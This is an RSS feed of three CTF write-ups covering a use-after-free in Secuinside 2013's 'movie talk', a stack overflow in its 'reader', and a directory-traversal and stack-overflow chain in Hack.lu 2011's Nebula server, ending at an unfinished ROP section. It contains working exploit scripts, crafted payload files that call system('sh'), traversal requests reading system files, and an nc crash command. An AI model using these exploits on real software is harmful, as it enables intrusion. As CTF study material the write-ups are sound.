<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: CLGT</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>[Secuinside CTF 2013] movie talk</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</guid>
  <description><![CDATA[
     <p>Challenge itself is very interesting, as we have typical use-after-free problem. It’s running on Ubuntu 13.04 with NX + ASLR.</p>

<p>When we run challenge it gives us message as :</p>

<pre class="brush: plain; title: ; notranslate" title="">######################################
#                                    #
#   Welcome to the movie talk show   #
#                                    #
######################################

1. movie addition
2. movie deletion
3. my movie list
4. quit
:
</pre>

<p>movie addition is very straight forward:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:080489F4                 mov     dword ptr [esp], 14h ; size
.text:080489FB                 call    _malloc
.text:08048A00                 mov     [ebp+movie_array], eax
.text:08048A03                 cmp     [ebp+movie_array], 0
.text:08048A07                 jnz     short __mem_alloc_ok
</pre>

<p>Alloc struct to hold movie_list which is described like this:</p>

<pre class="brush: plain; title: ; notranslate" title="">00000000 movie_list      struc ; (sizeof=0x14)
00000000 fn_moviedetails dd ?
00000004 movie_name      dd ?
00000008 movie_id        dd ?
0000000C movie_rating    dd ?
00000010 movie_rate      dd ?
</pre>

<p>Than we have small sleep of 2 seconds here:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:0804880A ; signed int __cdecl get_film_name_rating(movie_list a1)
.text:0804880A get_film_name_rating proc near
.text:0804880A                 push    ebp
.text:0804880B                 mov     ebp, esp
.text:0804880D                 sub     esp, 58h
.text:08048810                 mov     eax, [ebp+movie_array.fn_moviedetails]
.text:08048813                 mov     [ebp+l_movie_array], eax
.text:08048816                 mov     eax, large gs:14h
.text:0804881C                 mov     [ebp+cookie], eax
.text:0804881F                 xor     eax, eax
.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep   &lt;--- very important here is this sleep remember it for later
</pre>

<p>than movie name is obtained from input:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:0804882D                 mov     dword ptr [esp], offset aMovieName ; "movie name: "
.text:08048834                 call    _printf
.text:08048839                 mov     eax, ds:stdin
.text:0804883E                 mov     [esp+8], eax    ; stream
.text:08048842                 mov     dword ptr [esp+4], 1Eh ; n
.text:0804884A                 lea     eax, [ebp+nptr]
.text:0804884D                 mov     [esp], eax      ; s
.text:08048850                 call    _fgets
.text:08048855                 lea     eax, [ebp+nptr]
.text:08048858                 mov     [esp], eax      ; s
.text:0804885B                 call    _strlen
.text:08048860                 mov     [ebp+n], eax
.text:08048863                 mov     eax, [ebp+n]
.text:08048866                 add     eax, 1
.text:08048869                 mov     [esp], eax      ; size
.text:0804886C                 call    _malloc          &lt;--- malloc (also very important)
</pre>

<p>Other code is not important, as it reads movie rating, which can be in range from 0-101 (although code says movie rating 1-100), not really important. Also application asks for movie_rate which can be in range:</p>

<pre class="brush: plain; title: ; notranslate" title="">mov     dword ptr [esp], offset aFilmRate012151 ; "film rate [0,12,15,19]: "
</pre>

<p>Than ID of movie is assigned which is it’s current place in array of movies, and not actual ID, and function to display movie is stored also as part of movie_list struct.</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048989                 mov     edx, ds:g_count_of_array
.text:0804898F                 mov     eax, [ebp+l_movie_array]
.text:08048992                 mov     [eax+movie_list.movie_id], edx
.text:08048995                 mov     eax, [ebp+l_movie_array]
.text:08048998                 mov     [eax+movie_list.fn_moviedetails], offset PutMovieDetails
.text:0804899E                 mov     eax, 1
</pre>

<p>We noticed first that we can assign random ID to the movie, buy deleting them, and were looking at this code first. For example, when deleting movie this code is used to get it’s index:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048AFB                 call    _fgets
.text:08048B00                 movzx   eax, [ebp+s]
.text:08048B04                 movsx   eax, al
.text:08048B07                 sub     eax, 31h
</pre>

<p>Obviously, if we enter 10 it will always delete movie at index 0, as it considers only one char, thus we were looking where we can confuse program to reuse wrong index. Not good… nothing found. Code seemed like very well written, without errors. Every movie delete would fill gaps in array, thus code really seemed bullet-proof.</p>

<p>When code is about to exit, there was one function called, which would free whole array of movies:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048C3B                 push    ebp
.text:08048C3C                 mov     ebp, esp
.text:08048C3E                 sub     esp, 28h
.text:08048C41                 mov     [ebp+index], 0
.text:08048C48                 jmp     short loc_8048C94
.text:08048C4A __loop_delete:
.text:08048C4A                 mov     eax, [ebp+index]
.text:08048C4D                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C54                 test    eax, eax
.text:08048C56                 jz      short __no_movie
.text:08048C58                 mov     eax, [ebp+index]
.text:08048C5B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C62                 mov     eax, [eax+movie_list.movie_name]
.text:08048C65                 test    eax, eax
.text:08048C67                 jz      short __no_movie
.text:08048C69                 mov     eax, [ebp+index]
.text:08048C6C                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C73                 mov     eax, [eax+movie_list.movie_name]
.text:08048C76                 mov     [esp], eax      ; ptr
.text:08048C79                 call    _free
.text:08048C7E                 mov     eax, [ebp+index]
.text:08048C81                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C88                 mov     [esp], eax      ; ptr
.text:08048C8B                 call    _free
.text:08048C90
.text:08048C90 __no_movie:
.text:08048C90                 add     [ebp+index], 1
.text:08048C94
.text:08048C94 loc_8048C94:
.text:08048C94                 cmp     [ebp+index], 9
.text:08048C98                 jbe     short __loop_delete
.text:08048C9A                 leave
.text:08048C9B                 ret
</pre>

<p>This function, would give us full control over arrays of movies, as we could free movies, and reuse freed memory to be used later during printing movie:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax      &lt;-- if we free we could reuse movie.fn_moviedetails
 to execute our code.
</pre>

<p>Than we saw something interesting:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048CA5                 mov     dword ptr [esp+4], offset handler ; handler
.text:08048CAD                 mov     dword ptr [esp], 3 ; sig
.text:08048CB4                 call    _signal         ; SIGQUIT
</pre>

<p>We can invoke free on all lists by sending signal 3 to the process, so we can actually free structs. When we run into it, in a few sec we had working poc:** @__suto** replied on skype : 0×41414141 , and at the same time I replied with 0×61616161 so we knew we have eip control. Now I’ll try to explain how we got to this point. We found also way to leak address of puts from GOT thus we can recalculate system address and call system(“cat key.txt”), as this point we handed POC to <strong>xichzo</strong> which soon got key, and we got 550 <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>

<p>Leaking address is something we didn’t manage to do, as application can’t be piped to receive data in real time, eg. pipe is flushed only when process dies, thus even if we leak address it wouldn’t be too much use, as on next run address would be different. So here we go for explanation of our use-after-free exploit:</p>

<p>Break after 1st malloc when adding movie:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048A00
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048a00:    mov    DWORD PTR [ebp-0x10],eax
 0x8048a03:    cmp    DWORD PTR [ebp-0x10],0x0
 0x8048a07:    jne    0x8048a15
 0x8048a09:    mov    DWORD PTR [esp],0x8048e93
 0x8048a10:    call   0x80486fc
 0x8048a15:    mov    eax,DWORD PTR [ebp-0x10]
 0x8048a18:    mov    DWORD PTR [esp],eax
 0x8048a1b:    call   0x804880a
--------------------------------------------------------------------------------

Breakpoint 1, 0x08048a00 in ?? ()
</pre>

<p>Now comes sleep of 2 seconds, and we allocate 1st movie. This is very important to look at memory layout once 1st movie is added:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : AA 87 04 08 20 C0 04 08 - 01 00 00 00 00 00 00 00 .... ...........
0x0804C018 : 00 00 00 00 19 00 00 00 - 61 61 61 61 61 61 61 61 ........aaaaaaaa
0x0804C028 : 61 61 61 61 61 61 0A 00 - 00 00 00 00 D1 0F 02 00 aaaaaa..........
0x0804C038 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C058 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
</pre>

<p>So movie_list is:</p>

<pre class="brush: plain; title: ; notranslate" title="">00000000 fn_moviedetails        0x080487AA      &lt;--- display function
00000004 movie_name             0x0804C020      &lt;--- movie name
00000008 movie_id               0x1             &lt;--- index in global array of movies (not important)
0000000C movie_rating           0x0             &lt;--- dummy value which we set to be 0
00000010 movie_rate             0x0             &lt;--- dummy value which we set to be 0
</pre>

<p>Lets observe memory when we allocate 2nd movie_list:</p>

<pre class="brush: plain; title: ; notranslate" title="">EAX = 0x0804C038        &lt;--- right after our movie name string.
</pre>

<p>Now when process goes into sleep(2) at :</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep
</pre>

<p>We will fire killall -3 movie_talk to free memory occupied by 1st movie_list, and malloc for movie_name will be allocated here. To make it easier for debugging we can cheat by increasing timer to 32 sec:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x00000000  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C038  o d I t s Z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048828
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048828:    call   0x8048550 &lt;sleep@plt&gt;
 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 0x8048839:    mov    eax,ds:0x804b064
 0x804883e:    mov    DWORD PTR [esp+0x8],eax
 0x8048842:    mov    DWORD PTR [esp+0x4],0x1e
 0x804884a:    lea    eax,[ebp-0x2a]
 0x804884d:    mov    DWORD PTR [esp],eax
--------------------------------------------------------------------------------
0x08048828 in ?? ()
gdb$ break *0x804882d
Breakpoint 15 at 0x804882d
gdb$ set *(unsigned int *)$esp = 0x20
gdb$

...
=&gt; 0xb7fdd424 &lt;__kernel_vsyscall+16&gt;:    pop    ebp
 0xb7fdd425 &lt;__kernel_vsyscall+17&gt;:    pop    edx
 0xb7fdd426 &lt;__kernel_vsyscall+18&gt;:    pop    ecx
 0xb7fdd427 &lt;__kernel_vsyscall+19&gt;:    ret
</pre>

<p>Signal fired, and we can continue:</p>

<pre class="brush: plain; title: ; notranslate" title="">=&gt; 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 </pre>

<p>Now watch for malloc:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048871
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048871:    mov    edx,eax
 0x8048873:    mov    eax,DWORD PTR [ebp-0x3c]
 0x8048876:    mov    DWORD PTR [eax+0x4],edx
 0x8048879:    mov    eax,DWORD PTR [ebp-0x3c]
 0x804887c:    mov    eax,DWORD PTR [eax+0x4]
 0x804887f:    test   eax,eax
 0x8048881:    jne    0x804888f
 0x8048883:    mov    DWORD PTR [esp],0x8048e93
--------------------------------------------------------------------------------

Temporary breakpoint 20, 0x08048871 in ?? ()&lt;/pre&gt;
EAX = 0x804C008 &lt;--- where we had 1st movie list, thus we control movie_list and
function pointer at movie_list.fn_moviedetails
</pre>

<p>Lets look at memory after input is copied there:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : 61 61 61 61 61 61 61 61 - 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa
0x0804C018 : 0A 00 00 00 19 00 00 00 - 00 00 00 00 61 61 61 61 ............aaaa
0x0804C028 : 61 61 61 61 61 61 61 61 - 0A 00 00 00 19 00 00 00 aaaaaaaa........
0x0804C038 : 00 00 00 00 08 C0 04 08 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 B9 0F 02 00 - 00 00 00 00 00 00 00 00 ................
</pre>

<p>Woops, 1st movie_lsit is overwriten, now we can list movies and watch how our<br />
data goes to 0x61616161:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax

--------------------------------------------------------------------------[regs]
 EAX: 0x61616161  EBX: 0xB7FC3000  ECX: 0xB7FDA000  EDX: 0x0804C008  o d I t s z a p c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048C21
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048c21:    call   eax
 0x8048c23:    add    DWORD PTR [ebp-0xc],0x1
</pre>

<p>What is also important to notice here, is that movie list is pushed on stack, that means that stack layout is pointing to our controled buffer, so whatever we put into this movie_name, can be used as  argument for our code:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ x/4wx $esp
0xbffff150:    0x0804c008    0x0000000c    0xb7fc3ac0    0xb7e13900
               ^^^^^^^^^^
                   |
                   +---- our controled input

</pre>

<p>Address leak bonus, which was our 1st idea to get system address right away, was to leak puts address and do subtraction, unfortunately due to writing to pipe output would only come when pipe buffer is filled or process is terminated, so our idea didn’t work, but for fun here is our code to leak puts address:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ p puts-system
$1 = 0x26cf0
</pre>

<pre class="brush: plain; title: ; notranslate" title="">import time
import struct
import os
import subprocess

proc = subprocess.Popen("./movie_talk",
                        #shell=True,
                        stdin = subprocess.PIPE,
                        stdout = subprocess.PIP,
                        stderr = subprocess.PIPE);

payload = "1n" + "a" * 16 + "n0n0n"

#leak address of puts on ubuntu 13.04
payload += "1n";
payload += struct.pack("&lt;L", 0x80487aa);
payload += struct.pack("&lt;L", 0x804b030);
payload += struct.pack("&lt;L", 0x804b030);
payload += "n0n0n"
payload += "3n";
proc.stdin.write(payload);
time.sleep(3);
os.system("killall -3 movie_talk");
time.sleep(5);
proc.stdin.write("4n");
proc.wait();
buff = proc.stdout.read();
index = buff.find("movie id: 134524976");
index+=7;
index+=len("movie id: 134524976");
data = struct.unpack("&lt;L", buff[index:index+4]);
for x in data:
    print("puts address   : 0x%.08X" % x);
    print("system address : 0x%.08X" % (x-0x26cf0));
</pre>

<p>and simple exploit to crash process (enable core dump):</p>

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python
import  subprocess
import  time
import  os

proc = subprocess.Popen("./movie_talk",
                       shell=False,
                       stdin=subprocess.PIPE);

proc.stdin.write("1n" + "a"*16+"n"+"0n0n");
proc.stdin.write("1n" + "a"*16+"n"+"0n0n"); &lt;-- payload goes here
time.sleep(3);
os.system("killall -3 movie_talk");
proc.stdin.write("3n");
proc.stdin.write("4n");
proc.wait();

</pre>

  ]]></description>
</item>

	<item>
  <title>[Secuinside CTF 2013] Reader Writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-29T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html</guid>
  <description><![CDATA[
     <p><em>Description:</em></p>

<blockquote>
  <p>http://war.secuinside.com/files/reader</p>

  <p>ip : 59.9.131.155<br />
port : 8282 (SSH)<br />
account : guest / guest</p>

  <p>We have obtained a program designed for giving orders to criminals.</p>

  <p>Our investigators haven’t yet analyzed the file format this program reads.</p>

  <p>Please help us analyze the file format this program uses, find a vulnerability, and take a shell.</p>
</blockquote>

<p>From the description we can know this challenge requires an input file with correct format. Since it is simple to determine that format, I won’t talk deeper, you can find the details in sub_0804891A.<br />
So I will show the vulnerability in this “Reader”.</p>

<p>Below is the main routine of this challenge:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80490B8(signed int a1, int a2)
{
  int v2; // ecx@7
  int result; // eax@7
  int file; // [sp+20h] [bp-90h]@4
  char buffer[140]; // [sp+24h] [bp-8Ch]@1

  *(_DWORD *)&amp;buffer[136] = *MK_FP(__GS__, 20);
  if ( a1 &lt;= 1 )
  {
    printf("Usage: %s &lt;FILENAME&gt;n", *(_DWORD *)a2);
    exit(1);
  }
  sub_8048825(*(const char **)(a2 + 4));
  file = open(*(const char **)(a2 + 4), 0);
  if ( file &lt; 0 )
  {
    perror(&amp;byte_8049322);
    exit(1);
  }
  pre_path(file, (_DWORD *)buffer);
  vuln_path((_DWORD *)buffer);
  free_path((_DWORD *)buffer);
  close(file);
  result = 0;
  if ( *MK_FP(__GS__, 20) != *(_DWORD *)&amp;buffer[136] )
    __stack_chk_fail(v2, *MK_FP(__GS__, 20) ^ *(_DWORD *)&amp;buffer[136]);
  return result;
}
</pre>

<p>As you can see, variable buffer is used in multiple locations. After some minutes review I saw an interesting point in sub_08048C7A:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl vuln_path_(_DWORD *BUFF)
{
  size_t ulen; // eax@4
  int v2; // edx@4
  int v3; // ecx@4
  int result; // eax@4
  unsigned int i; // [sp+28h] [bp-20h]@1
  int v6; // [sp+3Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  for ( i = 0; BUFF[2] &gt; i; ++i )
  {
    putchar(*(_BYTE *)(BUFF[7] + i));
    fflush(stdout);
    usleep(BUFF[3]);
  }
  ulen = strlen((const char *)BUFF + 83);       // re-cal length (1)
  strncpy(BUFF[6], gPTR, ulen);                 // overflow occurs
  puts("n");
  result = *MK_FP(__GS__, 20) ^ v6;
  if ( *MK_FP(__GS__, 20) != v6 )
    __stack_chk_fail(v3, v2);
  return result;
}
</pre>

<p>The <em>strncpy()</em> function copies <strong>ulen</strong> bytes from <strong>gPTR</strong> to <strong>BUFF[6]</strong> without any limit check. So I back to main routine to see where <strong>BUFF[6]</strong> is initialized, and it is located in sub_08048D41:</p>

<pre class="brush: cpp; title: ; notranslate" title="">unsigned int index; // [sp+18h] [bp-20h]@1
  int s[7]; // [sp+1Ch] [bp-1Ch]@1

  bzero(s, 0x14u);
  putchar(10);
  for ( index = 0; *BUFF &gt; index; ++index )
  {
    putchar(*(_BYTE *)(BUFF[5] + index));
    fflush(stdout);
    usleep(BUFF[3]);
  }
  printf("nn ");
  for ( index = 0; BUFF[1] + 4 &gt; index; ++index )
  {
    putchar(*((_BYTE *)BUFF + 16));
    fflush(stdout);
    usleep(BUFF[3]);
  }
 .....
 .....
  BUFF[6] = &index;
 .....
 .....
</pre>

<p>So <strong>BUFF[6]</strong> is set to address of local variable of this function, we can clearly see this function is not protected by stack cookie. So it is just a simple buffer overflow issue. We can craft a valid file format and see where it gets the input to calculate <strong>ulen</strong> in (1). Back to sub_0804891A we can see:</p>

<pre class="brush: cpp; title: ; notranslate" title="">*BUFF = *(_DWORD *)&buf;
  read(fd, &amp;buf, 4u);
  BUFF[1] = *(_DWORD *)&buf;                    // read 4 bytes from file
  read(fd, &amp;buf, 4u);
  BUFF[2] = *(_DWORD *)&buf;
  read(fd, &amp;buf, 4u);
  BUFF[3] = *(_DWORD *)&buf;
  read(fd, &amp;buf, 1u);
  *((_BYTE *)BUFF + 16) = buf;
  if ( *BUFF &lt;= 4u || *BUFF &gt; 0x32u || BUFF[1] &gt; 0x64u || BUFF[2] &gt; 0x320u || !*((_BYTE *)BUFF + 16) )// 0x4-0x32 0x64 0x32
    ((void (__cdecl *)(_DWORD))ERR)("Initialization error");
  Copy(&amp;buf, (char *)BUFF + 32);
  BUFF[5] = malloc(*BUFF);
  if ( !BUFF[5] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  BUFF[6] = malloc(BUFF[1]);                    // use 4 bytes read above to malloc -&gt; BUFF[6] will has this length
  gPTR = (void *)BUFF[6]; -&gt; Set gPTR to BUFF[6]
  if ( !BUFF[6] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  BUFF[7] = malloc(BUFF[2]);
  if ( !BUFF[7] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  bzero((void *)BUFF[5], *BUFF);
  bzero((void *)BUFF[6], BUFF[1]);
  bzero((void *)BUFF[7], BUFF[2]);
  read(fd, (void *)BUFF[5], *BUFF);
  read(fd, (void *)BUFF[6], BUFF[1]);
  read(fd, (void *)BUFF[7], BUFF[2]);
</pre>

<p>Since it checks <strong>BUFF[1]</strong> with 0×64, I blindly set it to 0×63 to maximize the len of <strong>gPTR</strong> string and got a nice crash, so no need to do further investigation. Below is python code to generate valid <em>“test.sec”</em> file and trigger the crash:</p>

<pre class="brush: python; title: ; notranslate" title="">data = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
       + "x08x00x00x00"
       + "x63x00x00x00" # will become BUFF[1] and length of BUFF[6]
       + "x32x00x00x00"
       + "x00x00x00x00"
       + "X"*200
file = open("test.sec","w")
file.write(data)
file.close()
</pre>

<p>Run reader with <em>test.sec</em> and we got a crash looks like:</p>

<pre class="brush: plain; title: ; notranslate" title="">- THE END -
document identifier code: 14821847921482184792148218479214821847921482184792

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2
EBX: 0xb7fcfff4 --&gt; 0x1a0d7c
ECX: 0xffffffff
EDX: 0xb7fd18b8 --&gt; 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x58585858 ('XXXX')
ESP: 0xbffff640 ("XXXXXXXXXX")
EIP: 0x58585858 ('XXXX')
EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x58585858
[------------------------------------stack-------------------------------------]
0000| 0xbffff640 ("XXXXXXXXXX")
0004| 0xbffff644 ("XXXXXX")
0008| 0xbffff648 --&gt; 0x5858 ('XX')
0012| 0xbffff64c --&gt; 0xb7fff918 --&gt; 0x0
0016| 0xbffff650 --&gt; 0x0
0020| 0xbffff654 --&gt; 0x0
0024| 0xbffff658 --&gt; 0x0
0028| 0xbffff65c --&gt; 0xbffff794 --&gt; 0xbffff8b6 ("/home/suto/reader")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x58585858 in ?? ()
</pre>

<p>As this is a local exploit, <em>“ulimit -s unlimited”</em> trick will help to de-randomize libc and a simple system(“sh”) will work. Payload:</p>

<pre class="brush: plain; title: ; notranslate" title="">system = 0x4006b280
sh = 0x8048366
payload = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
         + "x08x00x00x00"
         + "x08x00x00x00"
         + "x32x00x00x00"
         + "x00x00x00x00"
         + "A"*37 # padding
         + struct.pack("&lt;L", system) + struct.pack("&lt;L", -1) + struct.pack("&lt;L", sh)
fd = open("test.sec","w")
fd.write(payload)
fd.close()
</pre>

  ]]></description>
</item>

	<item>
  <title>Hack.lu CTF 2011: Nebula Death Stick Services writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-10-03T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</guid>
  <description><![CDATA[
     <h2 id="challenge-information">Challenge Information</h2>

<blockquote>
  <p>Death Sticks are a totally illegal drug in the universe.<br />
However, somehow a company called Death Stick Services has managed to get a huge trade volume by selling Death Sticks directly and anonymously to their costumers.<br />
Seems like nobody has the power to stop them, so the Galactic’s Secret Service ordered YOU and your Special Forces team to get a Shell on Death Stick Service’s server and search for any evidence on how to take them down!<br />
May the force be with you.</p>

  <p>http://ctf.hack.lu:2010/</p>
</blockquote>

<h2 id="analysis">Analysis</h2>

<p><em>Thanks rd for helping Analysis part.</em></p>

<p>Checking around http://ctf.hack.lu:2010/ page, I found that there is a directory traversal vulnerability (<em>http://ctf.hack.lu:2010/?page=../../../../etc/resolv.conf</em>). Together with “<em>./a.out</em>” from HTTP response header, I managed to download the binary via this request <em>http://ctf.hack.lu:2010/?page=../a.out</em>.</p>

<p>“<em>a.out</em>” binary is a 32 bit x86 Linux binary, running on Ubuntu 10.10 server. There is a vulnerability in query parsing function parse_params as below.</p>

<p><a href="/wp/storage/uploads/2011/10/parse_params.jpg"><img class="aligncenter size-full wp-image-1236" title="parse_params" src="/wp/storage/uploads/2011/10/parse_params.jpg" alt="parse_params" width="372" height="407" /></a></p>

<p><strong>parse_params()</strong> function basically looks ‘<em>?</em>‘ and ‘<em>=</em>‘ in order to parse the input query such as <em>/?page=blah</em>, and then uses the different in length (<strong>len</strong>) to store parameter name and its value to the buffer on the stack of the caller function (<strong>handle_connection()</strong>). From above code, you can see that if we input in reverse order of ‘<em>?</em>‘ and ‘<em>=</em>‘ such as* /=blah?*, <strong>len</strong> value will be negative but it still pass the the condition check because of signed comparison. This leads into a traditional stack buffer overflow.</p>

<blockquote>
  <p>$ python2 -c ‘print “GET /=” + “A”*60 + “? HTTP/”‘|nc -v localhost 2010<br />
..<br />
(gdb) run<br />
Starting program: /home/jail/ctf/hack.lu/o500/a.out<br />
Notice: Nebulaserv – A Webserver for Nebulacorp</p>

  <p>Notice: Starting up!</p>

  <ul>
    <li>Accepting requests on port 2010<br />
[New process 4626]  </li>
    <li>
      <p>Got request with length 0: 127.0.0.1:35695 – GET /=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA? HTTP/</p>
    </li>
    <li>Got param: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt; with value  </li>
    <li>Opening ./nebula/index – 404 Not Found</li>
  </ul>

  <p>Program received signal SIGSEGV, Segmentation fault.<br />
[Switching to process 4626]<br />
0×41414141 in ?? ()</p>
</blockquote>

<h2 id="exploit">Exploit</h2>

<p>The binary has NX and ASLR enabled so we have to leak libc info from server for ROP/ret2libc exploit. During the game, to save time we utilized shell on the same server from Nebula DB challenge to retrieved libc, then constructed a ROP payload to call a custom shell script as <em>system(“/tmp/sh”)</em>. After the game, we investigate more to see if we can exploit without any knowledge of server. And here is the way we do:</p>

<h3 id="retrieve-libc">Retrieve libc</h3>

<p>In **handle_connection() **function socket fd is increased for every new connection. Though we can find this value on stack, it is still difficult to find code chunks to write back something valuable to our socket. Instead, we can utilize the directory traversal bug above to retrieve libc via this request: <span style="font-style: italic">http://ctf.hack.lu:2010/?page=../../../../lib/libc.so.6</span></p>

<h3 id="construct-rop-payload">Construct ROP payload</h3>

